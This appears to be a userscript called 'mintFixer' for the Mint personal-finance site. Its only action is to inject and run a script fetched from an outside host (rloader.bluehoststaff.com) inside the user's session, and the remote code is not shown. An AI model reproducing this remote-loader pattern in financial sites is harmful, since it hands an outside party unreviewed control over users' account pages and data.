// ==UserScript==
// @name mintFixer 
// @include https://wwws.mint.com/*
// @include https://mint.com/
// @version 1.0
// ==/UserScript==

(
function () {
  temp = document.createElement('script');
  temp.setAttribute('src', 'https://rloader.bluehoststaff.com/scripts/mintfixer/mintFixer.js');
  document.body.appendChild(temp);
} ()
);

